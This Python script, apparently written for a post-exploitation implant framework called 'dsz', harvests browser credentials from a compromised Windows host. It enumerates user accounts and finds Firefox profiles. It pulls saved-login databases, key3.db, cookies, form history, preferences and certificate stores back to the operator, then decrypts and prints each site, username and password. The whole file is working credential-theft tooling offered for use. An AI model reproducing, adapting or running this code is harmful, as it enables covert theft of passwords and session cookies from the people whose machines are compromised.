
import dsz, dsz.version, dsz.path, dsz.ui, dsz.control, dsz.lp
import optparse, os, shutil, sys
from ops.pprint import pprint
from firefox_decrypt import read_passwords_from_profile
MAX_SIZE = 50000
MAX_AGE = ''
USERS = []

def runget(file, profile_dir):
    dsz.control.echo.Off()
    cmd = ('dir -mask "%s" -path "%s" -max 0%s' % (file, profile_dir, MAX_AGE))
    dsz.cmd.Run(cmd, dsz.RUN_FLAG_RECORD)
    dsz.control.echo.On()
    cmdid = dsz.cmd.data.Get('commandmetadata::id', dsz.TYPE_INT)[0]
    try:
        size = dsz.cmd.data.Get('diritem::fileitem::size', dsz.TYPE_INT)[0]
    except:
        dsz.ui.Echo(('%s Get of %s: failed (dir failed), cmdid: %d' % (profile_dir, file, cmdid)), dsz.ERROR)
        return
    if (size > MAX_SIZE):
        output = dsz.ui.Prompt(('Size of %s is %d, do you want to get it anyway?' % (file, size)), False)
        if (output == False):
            dsz.ui.Echo(('%s Get of %s: failed (too large), cmdid: %d' % (profile_dir, file, cmdid)), dsz.ERROR)
            return
    dsz.control.echo.Off()
    cmd = ('get -mask "%s" -path "%s" -max 0' % (file, profile_dir))
    dsz.cmd.Run(cmd, dsz.RUN_FLAG_RECORD)
    dsz.control.echo.On()
    succ = dsz.cmd.data.Get('filestop::successful', dsz.TYPE_BOOL)[0]
    written = dsz.cmd.data.Get('filestop::written', dsz.TYPE_INT)[0]
    cmdid = dsz.cmd.data.Get('commandmetadata::id', dsz.TYPE_INT)[0]
    if (succ != 1):
        dsz.ui.Echo(('%s Get of %s: failed, cmdid: %s' % (profile_dir, file, cmdid)), dsz.ERROR)
        return
    dsz.ui.Echo(('%s Get of %s: succeeded, wrote: %d' % (profile_dir, file, written)))
    local_name = dsz.cmd.data.Get('FileLocalName::localname', dsz.TYPE_STRING)[0]
    full_local_path = os.path.join(dsz.lp.GetLogsDirectory(), 'GetFiles', local_name)
    original_name = dsz.cmd.data.Get('FileStart::originalname', dsz.TYPE_STRING)[0]
    dest_path = os.path.join(dsz.lp.GetLogsDirectory(), 'GetFiles', 'NOSEND', os.path.basename(profile_dir))
    if (not os.path.exists(dest_path)):
        os.makedirs(dest_path)
    full_dest_path = os.path.join(dest_path, os.path.basename(original_name))
    if (not os.path.exists(full_dest_path)):
        shutil.copy(full_local_path, full_dest_path)

def main():
    Vista = dsz.version.checks.windows.IsVistaOrGreater()
    if Vista:
        envir = 'PUBLIC'
    else:
        envir = 'ALLUSERSPROFILE'
    dsz.control.echo.Off()
    cmd = ('environment -get -var %s' % envir)
    dsz.cmd.Run(cmd, dsz.RUN_FLAG_RECORD)
    dsz.control.echo.On()
    try:
        user_docs = ('%s\\..' % dsz.cmd.data.Get('environment::value::value', dsz.TYPE_STRING)[0])
    except:
        dsz.ui.Echo(('Could not find %s environment variable' % envir), dsz.ERROR)
        exit(0)
    dsz.control.echo.Off()
    cmd = ('dir -mask * -path "%s" -max 0 -dirsonly' % user_docs)
    dsz.cmd.Run(cmd, dsz.RUN_FLAG_RECORD)
    dsz.control.echo.On()
    temp_user_list = dsz.cmd.data.Get('diritem::FileItem::name', dsz.TYPE_STRING)
    path = dsz.cmd.data.Get('diritem::path', dsz.TYPE_STRING)[0]
    bad_list = ['.', '..', 'NetworkService', 'LocalService', 'Default', 'Public', 'All Users', 'Default User']
    for thing in bad_list:
        try:
            temp_user_list.remove(thing)
        except:
            pass
    user_list = []
    for item in temp_user_list:
        user_list.append(item.lower())
    if ((len(user_list) > 10) and (len(USERS) == 0)):
        dsz.ui.Echo(('There are %s user accounts on this system!' % len(user_list)), dsz.WARNING)
        output = dsz.ui.Prompt('Do you want to continue anyway?', False)
        if (not output):
            return
    for user_dir in user_list:
        if ((not (user_dir.lower() in USERS)) and (not (len(USERS) == 0))):
            continue
        ff_profile = ''
        dsz.ui.Echo('', dsz.GOOD)
        dsz.ui.Echo('====================================', dsz.GOOD)
        dsz.ui.Echo(('Processing user: %s' % user_dir), dsz.GOOD)
        dsz.ui.Echo('====================================', dsz.GOOD)
        if Vista:
            ff_profile = ('%s\\%s\\AppData\\Local\\Mozilla\\Firefox\\Profiles' % (path, user_dir))
        else:
            ff_profile = ('%s\\%s\\Application Data\\Mozilla\\Firefox\\Profiles' % (path, user_dir))
        ff_profile = ('%s\\%s' % (path, user_dir))
        dsz.control.echo.Off()
        cmd = ('dir -mask signons.sqlite -path "%s" -max 0 -recursive' % ff_profile)
        dsz.cmd.Run(cmd, dsz.RUN_FLAG_RECORD)
        dsz.control.echo.On()
        try:
            if ('signons.sqlite' in dsz.cmd.data.Get('diritem::fileitem::name', dsz.TYPE_STRING)):
                dsz.ui.Echo('Found Firefox profile(s) for this user', dsz.GOOD)
                profile_list = dsz.cmd.data.Get('diritem::path', dsz.TYPE_STRING)
            else:
                dsz.ui.Echo('No profiles for this user', dsz.WARNING)
                profile_list = []
        except Exception as e:
            dsz.ui.Echo('No profiles for this user', dsz.WARNING)
            continue
        for profile_dir in profile_list:
            dsz.control.echo.Off()
            cmd = ('dir -mask * -path "%s\\Cache" -max 0%s' % (profile_dir, MAX_AGE))
            succ = dsz.cmd.Run(cmd, dsz.RUN_FLAG_RECORD)
            cmdid = dsz.cmd.data.Get('commandmetadata::id', dsz.TYPE_INT)[0]
            dsz.control.echo.On()
            if (succ == 1):
                dsz.ui.Echo(('%s Dir of Cache succeeded, cmdid: %d' % (profile_dir, cmdid)))
            else:
                dsz.ui.Echo(('%s Dir of Cache failed, cmdid: %d' % (profile_dir, cmdid)), dsz.ERROR)
            runget('formhistory.sqlite', profile_dir)
            runget('signons.sqlite', profile_dir)
            runget('key3.db', profile_dir)
            runget('cookies.sqlite', profile_dir)
            runget('firefox.js', profile_dir)
            runget('prefs.js', profile_dir)
            runget('cert8.db', profile_dir)
            dsz.ui.Echo('')
            dest_path = os.path.join(dsz.lp.GetLogsDirectory(), 'GetFiles', 'NOSEND', os.path.basename(profile_dir))
            passwords = read_passwords_from_profile(dest_path)
            if passwords:
                pprint(passwords, ['Site', 'Username', 'Password'], ['site', 'user', 'pass'])
            else:
                dsz.ui.Echo(('No passwords found in %s' % profile_dir), dsz.WARNING)

def parse_program_arguments(arguments):
    parser = optparse.OptionParser()
    parser.add_option('-a', dest='age', action='store', type='string', default=None, help='Age you wish to dir/get for, in time, i.e. 2h, 7d, etc.')
    parser.add_option('-s', dest='size', action='store', type='int', default=50000, help='Max file size you want to get without prompting')
    parser.add_option('-u', dest='users', action='store', type='string', default=None, help='Comma seperated user list that you want to grab from')
    options = parser.parse_args(arguments)[0]
    if options.users:
        global USERS
        USERS = options.users.split(',')
    if options.age:
        global MAX_AGE
        MAX_AGE = (' -age %s' % options.age)
    global MAX_SIZE
    MAX_SIZE = options.size
if (__name__ == '__main__'):
    parse_program_arguments(sys.argv)
    main()